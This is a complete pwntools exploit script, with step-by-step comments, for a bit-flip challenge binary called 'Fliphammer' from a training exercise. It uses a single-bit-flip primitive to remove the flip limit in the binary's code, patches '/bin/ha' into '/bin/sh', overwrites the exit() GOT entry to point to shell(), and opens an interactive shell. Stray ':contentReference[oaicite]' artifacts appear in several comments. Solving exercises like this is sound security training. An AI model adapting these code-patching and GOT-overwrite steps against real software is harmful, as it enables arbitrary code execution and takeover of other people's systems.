#!/usr/bin/env python3
from pwn import *
import sys
import os

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# Path to the challenge binary (built with `make ex2`)
exe = './bin/ex2'

# Tell pwntools what binary we’re working with.
# This lets us query symbols, GOT entries, etc.
elf = context.binary = ELF(exe, checksec=False) 

# Default to verbose I/O so we can see the interaction.
# Change to 'info' or 'warning' once you’re confident it works.
context.log_level = 'debug'


def start():
    """
    Start the vulnerable process locally.

    The C code for main() checks argc and if > 1 sets SKIP_SLEEP = 1,
    which skips the slow intro sleeps. So we pass a dummy argument
    ('no_sleep') to avoid waiting. :contentReference[oaicite:1]{index=1}
    """
    if not os.path.exists(exe):
        log.error(f"Binary {exe} not found. Run 'make ex2' first.")
        sys.exit(1)

    # Run: ./bin/ex2 no_sleep
    return process([exe, 'no_sleep'])


def solve():
    """
    Full exploit for Exercise 2 - Fliphammer.

    High level:
      1. Abuse the single allowed bit flip in flip_bit() to disable the
         FLIPPED limiter -> infinite flips.
      2. Patch the hardcoded command string from "/bin/ha" to "/bin/sh".
      3. Overwrite the GOT entry for exit() to point to shell().
      4. Choose EXIT in the menu to get a shell.
    """
    io = start()

    # The binary prints an intro with a line of dashes.
    # Sync on that so we start at a known point in the I/O stream.
    io.recvuntil(b'--------------------------\n\n')

    # -----------------------------------------------------------------------
    # Helper: perform a single bit flip via the menu
    # -----------------------------------------------------------------------
    def flip(addr: int, bit: int):
        """
        Ask the program to flip a single bit at the given address.

        The C side does:
          - scanf("%llx", &target);
          - scanf("%u", &bitnum);
          - flip_bit(target, bitnum);

        We:
          - Select <1> FLIP
          - Send the address in hex (e.g. '7ffff7dd0000')
          - Send the bit index (0..7)
          - Abort if the flip fails.
        """
        log.info(f"Flipping {hex(addr)} bit {bit}...")

        # 1. Select FLIP option in the menu
        io.recvuntil(b'EXIT')
        io.sendline(b'1')

        # 2. Send TARGET address (as hex string)
        io.sendline(hex(addr).encode())

        # 3. Send BIT number (decimal)
        io.sendline(str(bit).encode())

        # 4. Wait for the success / failure message
        result = io.recvuntil([b"FLIP SUCCESSFUL", b"FLIPPING FAILED"])

        if b"FLIPPING FAILED" in result:
            log.error(f"Flip failed at {hex(addr)} bit {bit}. Message: {result.strip()}")
            sys.exit(1)

    # -----------------------------------------------------------------------
    # Phase 1: Unlock infinite flips (defeat FLIPPED limiter)
    # -----------------------------------------------------------------------
    log.info("Phase 1: Analyzing binary for infinite ammo...")

    # Address of flip_bit() function in the binary
    flip_bit_addr = elf.symbols['flip_bit']

    # Read the first ~500 bytes of flip_bit() from the binary on disk.
    # We will search this snippet for the instruction that sets FLIPPED = 1.
    code = elf.read(flip_bit_addr, 500)

    # In the compiled code, "FLIPPED = 1;" typically becomes:
    #   mov BYTE PTR [rip+offset], 0x1
    # whose opcode bytes start with: 0xC6 0x05 <4-byte-rel32> 0x01
    #
    # So we search for the pattern C6 05 and then check if the 7th byte
    # (index + 6) is 0x01 (the immediate).
    offset = code.find(b'\xc6\x05')
    target_byte_addr = 0

    while offset != -1:
        # pattern: C6 05 xx xx xx xx 01
        if offset + 6 < len(code) and code[offset + 6] == 0x01:
            instruction_addr = flip_bit_addr + offset
            # Immediate byte (0x01) is 6 bytes after the start of the instruction
            target_byte_addr = instruction_addr + 6
            log.success(f"Found 'FLIPPED = 1' instruction at {hex(instruction_addr)}")
            log.success(f"Target immediate byte (0x01) is at {hex(target_byte_addr)}")
            break
        offset = code.find(b'\xc6\x05', offset + 1)

    if target_byte_addr == 0:
        log.error("Could not find the 'FLIPPED = 1' instruction!")
        sys.exit(1)

    # Right now that immediate is 0x01. If we flip bit 0 at that byte,
    # 0x01 -> 0x00. That turns "FLIPPED = 1" into "FLIPPED = 0", so the
    # global FLIPPED is never set and we can call flip_bit() infinitely. :contentReference[oaicite:2]{index=2}
    log.info("Unlocking infinite flips...")
    flip(target_byte_addr, 0)
    log.success("Infinite flips unlocked!")

    # -----------------------------------------------------------------------
    # Phase 2: Patch the shell command from /bin/ha to /bin/sh
    # -----------------------------------------------------------------------
    # In the C code:
    #   void shell() { system("/bin/ha"); }  :contentReference[oaicite:3]{index=3}
    #
    # We want to turn that into: system("/bin/sh").
    bin_sh_addr = next(elf.search(b"/bin/ha"))
    log.info(f"Found '/bin/ha' string at {hex(bin_sh_addr)}")

    # The string layout in memory:
    #   bin_sh_addr:     '/'
    #   bin_sh_addr + 1: 'b'
    #   bin_sh_addr + 2: 'i'
    #   bin_sh_addr + 3: 'n'
    #   bin_sh_addr + 4: '/'
    #   bin_sh_addr + 5: 'h' (0x68) -> we want 's' (0x73)
    #   bin_sh_addr + 6: 'a' (0x61) -> we want 'h' (0x68)

    # --- Patch 'h' (0x68) -> 's' (0x73) at offset +5 ---
    current_char = 0x68
    target_char = 0x73
    diff = current_char ^ target_char  # bits that must be flipped

    for i in range(8):
        if (diff >> i) & 1:
            # For each bit where current != target, flip that bit in memory.
            flip(bin_sh_addr + 5, i)

    # --- Patch 'a' (0x61) -> 'h' (0x68) at offset +6 ---
    current_char = 0x61
    target_char = 0x68
    diff = current_char ^ target_char

    for i in range(8):
        if (diff >> i) & 1:
            flip(bin_sh_addr + 6, i)

    log.success("String patched to '/bin/sh'.")

    # -----------------------------------------------------------------------
    # Phase 3: Overwrite GOT entry for exit() to point to shell()
    # -----------------------------------------------------------------------
    # When the user selects EXIT, main() calls exit(0).
    # If we overwrite exit@GOT to shell(), EXIT becomes our shell gadget.

    shell_addr = elf.symbols['shell']  # address of shell()
    exit_got = elf.got['exit']         # address of exit@GOT

    # Read the original GOT entry value (8 bytes) and unpack as u64.
    initial_exit_val = u64(elf.read(exit_got, 8))

    log.info(f"Overwrite GOT: exit ({hex(initial_exit_val)}) -> shell ({hex(shell_addr)})")

    # Bitmask of bits that differ between current GOT value and target.
    diff = initial_exit_val ^ shell_addr

    # The flip primitive works on one *byte* and one *bit index* (0..7),
    # but here diff is expressed as a 64-bit integer.
    #
    # For each bit i that differs, we compute:
    #   - which byte it lives in (i // 8)
    #   - which bit inside that byte (i % 8)
    # and issue a flip() on that exact location.
    for i in range(64):
        if (diff >> i) & 1:
            byte_offset = i // 8
            bit_remainder = i % 8
            flip(exit_got + byte_offset, bit_remainder)

    log.success("GOT table patched (exit -> shell).")

    # -----------------------------------------------------------------------
    # Phase 4: Trigger the shell via EXIT
    # -----------------------------------------------------------------------
    log.info("Selecting EXIT to trigger shell...")
    io.recvuntil(b'EXIT')
    io.sendline(b'2')

    # Drop to an interactive shell (less debug spam now).
    context.log_level = 'info'
    io.interactive()


if __name__ == "__main__":
    solve()

